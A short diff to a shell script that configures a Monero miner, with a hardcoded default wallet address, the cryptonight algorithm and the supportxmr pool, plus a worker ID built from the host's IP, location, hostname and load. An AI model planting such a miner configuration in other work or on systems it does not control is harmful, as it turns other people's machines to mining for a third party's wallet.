@@ -119,8 +119,10 @@ export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
 
 ## vars for the object config
 read loadavg < /proc/loadavg
+loadavg=${loadavg% *[0-9]\/*} ## strip proc counters
+ID=${ID:-"{$ip}{$country}{$region}{$HOSTN}{${ENDPOINT:-$TNL_LISTEN_TARGET}}{{${loadavg// /|}}}"}
 export \
-ID=${ID:-"{$ip}{$country}{$region}{$HOSTN}{${ENDPOINT:-$TNL_LISTEN_TARGET}{${loadavg// /|}}}"} \
+ID=$(printf '%s' "$ID") \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 AL=${AL:-cryptonight} \
 ENDPOINT=${ENDPOINT:-pool.supportxmr.com:${PAUSD_DIFF:-3333}}
